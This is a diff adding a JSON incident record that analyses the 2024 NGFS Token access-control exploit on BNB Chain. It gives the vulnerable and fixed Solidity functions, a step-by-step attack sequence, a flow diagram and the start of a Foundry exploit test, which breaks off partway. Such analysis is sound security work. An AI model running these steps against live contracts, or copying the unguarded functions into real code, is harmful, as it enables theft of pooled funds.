@@ -1,0 +1,39 @@
+{
+ "id": "2024__2024-04-25_NGFSToken_AccessControl_BSC",
+ "source_file": "2024/2024-04-25_NGFSToken_AccessControl_BSC.md",
+ "title": "NGFS Token — Access Control Vulnerability Analysis",
+ "date": "2024-04-25",
+ "protocol": "NGFS Token",
+ "chain": "BSC",
+ "loss_raw": "~$190,000 (USDT)",
+ "loss_usd": 190000.0,
+ "root_cause": "Unauthorized addresses could sequentially call the proxy registration and balance manipulation functions (missing access control)",
+ "attack_tx": "0x8ff7...de25",
+ "vulnerable_contract": "0xa608...1E3A",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code — anyone can register themselves as proxy with a single call\nfunction delegateCallReserves() public {\n    // Danger: no owner-verification modifier. There is a flag to allow only one execution,\n    //         but there is no mechanism to prevent front-running that single opportunity.\n    require(!uniswapV2Dele, \"ERC20: delegateCall launch\");\n    _uniswapV2Proxy = _msgSender(); // ← the caller becomes the privileged proxy\n    uniswapV2Dele = !uniswapV2Dele;\n}",
+  "// ❌ Vulnerable code — the already-hijacked _uniswapV2Proxy (= attacker) can replace the library\nfunction setProxySync(address _addr) external {\n    require(_addr != ZERO, \"ERC20: library to the zero address\");\n    require(_addr != DEAD, \"ERC20: library to the dead address\");\n    require(msg.sender == _uniswapV2Proxy, \"ERC20: uniswapPrivileges\");\n    // Attacker sets their own contract address as _uniswapV2Library\n    _uniswapV2Library = IPancakeLibrary(_addr);\n    _isExcludedFromFee[_addr] = true; // fee exemption is also granted\n}",
+  "// ❌ Vulnerable code — _uniswapV2Library (= attacker's contract) can inflate any address's balance\nfunction reserveMultiSync(address syncAddr, uint256 syncAmount) public {\n    // Validation: only checks whether msg.sender is _uniswapV2Library\n    // After replacing _uniswapV2Library with their own contract, the attacker can call this directly\n    require(_msgSender() == address(_uniswapV2Library), \"ERC20: uniswapPrivileges\");\n    require(syncAddr != address(0), \"ERC20: multiSync address is zero\");\n    require(syncAmount > 0,         \"ERC20: multiSync amount equal to zero\");\n    // Danger: copies the LP pool's entire balance directly to the attacker's address\n    //         (not an actual transfer — directly writes the balance)\n    _balances[syncAddr] = _balances[syncAddr].air(syncAmount);\n    _isExcludedFromFee[syncAddr] = true;\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — only the owner can designate the proxy, or fix it at deploy time\nfunction delegateCallReserves() public onlyOwner {\n    // Fix: only the deployer can initialize via onlyOwner\n    require(!uniswapV2Dele, \"ERC20: delegateCall launch\");\n    _uniswapV2Proxy = _msgSender();\n    uniswapV2Dele = !uniswapV2Dele;\n}\n\n// Or, safer: set directly in the constructor at deployment\nconstructor() {\n    _uniswapV2Proxy = _msgSender(); // deployer becomes proxy\n    uniswapV2Dele = true;          // prevents re-registration thereafter\n}",
+  "// ✅ Fixed code — only the owner can replace the library, or lock it as immutable\nfunction setProxySync(address _addr) external onlyOwner {\n    // Fix: only the deployer (owner) can set the library\n    require(_addr != ZERO, \"ERC20: library to the zero address\");\n    require(_addr != DEAD,  \"ERC20: library to the dead address\");\n    _uniswapV2Library = IPancakeLibrary(_addr);\n    _isExcludedFromFee[_addr] = true;\n}"
+ ],
+ "steps": [
+  "1. **Step 1**: Call `NGFS.delegateCallReserves()` → attacker registers as `_uniswapV2Proxy`",
+  "2. **Step 2**: Call `NGFS.setProxySync(attackContract)` → replace `_uniswapV2Library` with the attack contract",
+  "3. **Step 3**: Query the NGFS balance of the PancakeSwap LP pool (`INGFSToken.balanceOf(pair)`)",
+  "4. **Step 4**: Call `NGFS.reserveMultiSync(attackContract, pairBalance)` → directly write the LP pool's NGFS balance to the attacker's account",
+  "5. **Step 5**: `NGFS.approve(PancakeRouter, MAX)` → authorize swap",
+  "6. **Step 6**: Swap NGFS → USDT via PancakeRouter to realize profit",
+  "⑤ approve → swap NGFS→USDT",
+  "Sell NGFS → Receive USDT"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────┐\n│         Attacker (EOA)           │\n│  0xd03d...54a0                  │\n└──────────────┬──────────────────┘\n               │ ① delegateCallReserves()\n               ▼\n┌─────────────────────────────────┐\n│       NGFS Token Contract        │\n│  _uniswapV2Proxy = Attacker ✓  │\n│  uniswapV2Dele   = true        │\n└──────────────┬──────────────────┘\n               │ ② setProxySync(attackContract)\n               ▼\n┌─────────────────────────────────┐\n│       NGFS Token Contract        │\n│  _uniswapV2Library = Attack Contract│\n│  Added to fee exemption list    │\n└──────────────┬──────────────────┘\n               │ ③ balanceOf(LP Pool) query\n               ▼\n┌─────────────────────────────────┐\n│  PancakeSwap LP Pool             │\n│  NGFS balance: ~190K USDT equiv",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\n// ① BSC fork setup — reproduces state immediately before the attack block (38,167,372)\nfunction setUp() public {\n    vm.createSelectFork(\"bsc\", 38_167_372);\n}\n\nfunction testExploit() public {\n    // ② Record USDT balance before attack\n    uint256 tokenBalanceBefore = IBEP20(USDT_TOKEN).balanceOf(address(this));\n\n    // ③ Query NGFS/USDT LP pool address\n    address pair = IPancakeFactory(PANCAKE_FACTORY).getPair(NGFS_TOKEN, USDT_TOKEN);\n\n    // ④ Key 1: register as proxy by calling function with no access control\n    //    — this test contract (= attacker) becomes _uniswapV2Proxy\n    INGFSToken(NGFS_TOKEN).delegateCallReserves();\n\n    // ⑤ Key 2: set self (attack contract) as the library\n    //    — this contract now has perm"
+ ]
+}
